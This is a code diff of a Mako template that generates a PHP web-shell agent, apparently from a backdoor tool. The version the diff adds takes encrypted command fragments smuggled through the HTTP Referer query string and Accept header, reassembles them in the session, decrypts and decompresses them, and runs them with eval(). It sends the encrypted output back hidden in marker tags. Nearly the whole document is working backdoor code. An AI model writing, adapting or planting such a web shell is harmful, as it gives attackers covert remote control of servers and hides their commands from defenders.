@@ -1,12 +1,11 @@
-<%! import hashlib %><% 
-key = hashlib.md5(password).hexdigest(); 
-trigger = key[:3]
-terminator = key[3:6] 
-%>$k="${trigger}"; 
-$e="${terminator}";
+<%! import hashlib %><%
+key = hashlib.md5(password).hexdigest().lower()
+header = key[:4]
+footer = key[4:8]
+%>$kh="${header}"; 
+$kf="${footer}";
+$k="${key[:8]}";
 <%text>
-
-print("<$k${e}DEBUG>STEP0</$k${e}DEBUG>");
 
 error_reporting(E_ALL);
 function x($t,$k) {
@@ -22,43 +21,78 @@ function x($t,$k) {
 	 return $o;
 }
 
+$r=$_SERVER;
 
-$u = parse_url($_SERVER["HTTP_REFERER"]);
 $q=null;
-if(isset($u["query"])) parse_str($u["query"], $q);
+if (isset($r["HTTP_REFERER"])){
+  $u=parse_url($r["HTTP_REFERER"]);
+  if(isset($u["query"])) parse_str($u["query"],$q);
+  $q=array_values($q);
+}
 
-print("<$k${e}DEBUG>STEP1</$k${e}DEBUG>");
+$m=null;
+if (isset($r['HTTP_ACCEPT'])){
+  $a=$r['HTTP_ACCEPT'];
+  if(isset($a)) preg_match_all('/([\w])[\w-]+(?:;q=0.([\d]))?,?/',$a,$m);
+}
 
-if ($q) {
+print("<$kh${kf}DEBUG>REQ OK?</$kh${kf}DEBUG>");
+if ($q && $m) {
+	print("<$kh${kf}DEBUG>REQ OK!</$kh${kf}DEBUG>");
 
-	$r = x($_SERVER["HTTP_USER_AGENT"], $k);
+   @session_start();
 
-	print("<$k${e}DEBUG>STEP2</$k${e}DEBUG>");
+   $s=&$_SESSION;
 
-	foreach($q as $p) {
-	
-		$kp = strpos($p,$k);
-		$ep = strpos($p,$e);
+   $i = $m[1][0].$m[1][1];
+   $h = strtolower(substr(md5($i.$kh),0,3));
+   $f = strtolower(substr(md5($i.$kf),0,3));
+
+	// TODO: use a regexp to shortify
+   print("<$kh${kf}DEBUG>ORDER: "); var_dump($q); var_dump($m[2]); print("</$kh${kf}DEBUG>");
+
+   $p='';
+   for($z=1;$z<count($m[1]);$z++) $p=$p.$q[$m[2][$z]];
+
+   print("<$kh${kf}DEBUG>HEADER $h in $p = ".strpos($p,$h)."?</$kh${kf}DEBUG>");
+
+   // The header corresponds, initialize a SESSION START
+   if(strpos($p,$h)===0){
+		print("<$kh${kf}DEBUG>HEADER OK!</$kh${kf}DEBUG>");
+		$s[$i] = '';
+		$p=substr($p,3);
+   }
+
+   print("<$kh${kf}DEBUG>ID IN SESSION? ". var_dump($s) ."</$kh${kf}DEBUG>");
+   // If there is the session, could be SESSION MIDDLE or SESSION END
+   if(array_key_exists($i,$s)) {
+
+		print("<$kh${kf}DEBUG>ID OK!</$kh${kf}DEBUG>");
 		
-		print("<$k${e}DEBUG>Check in kp=$kp ep=$ep k=$k e=$e </$k${e}DEBUG>");
+		$s[$i]=$s[$i].$p;
 		
-		if (($ep !== false) || ($kp !== false)) {
-			@session_start();
-			$s=&$_SESSION["s"];
-			$s.=preg_replace(array("#$e.*#","#$k#","#_#"),array("","","+"),$p);
-			if($ep !== false) {
-				
-				ob_start();
-				eval(gzuncompress(x(base64_decode($s),$r)));
-				$o=ob_get_contents();
-				ob_end_clean();
-				$d=base64_encode(x(gzcompress($o),$r));
-				print("<$k$e>$d</$k$e>");
-				@session_destroy();
-			}
+		// Check if is SESSION END
+		$e=strpos($s[$i],$f);
+		print("<$kh${kf}DEBUG>FOOTER $f in $s[$i]? $e</$kh${kf}DEBUG>");
+		
+		if($e){
+			$b64 = preg_replace(array("/_/","/-/"),array("/","+"),substr($s[$i],0,$e));
+			
+			print("<$kh${kf}DEBUG>OK FOOTER!</$kh${kf}DEBUG>");
+			//var_dump(gzuncompress(x(base64_decode($b64),$k)));
+			//eval(gzuncompress(x(base64_decode($b64),$k)));
+			//print("");
+			
+			ob_start();
+			eval(gzuncompress(x(base64_decode($b64),$k)));
+			$o=ob_get_contents();
+			ob_end_clean();
+			$d=base64_encode(x(gzcompress($o),$k));
+			print("<$kh${kf}>$d</$kh${kf}>");
+			@session_destroy();
 			
 		}
-	}
+   }
 }
 
 </%text>
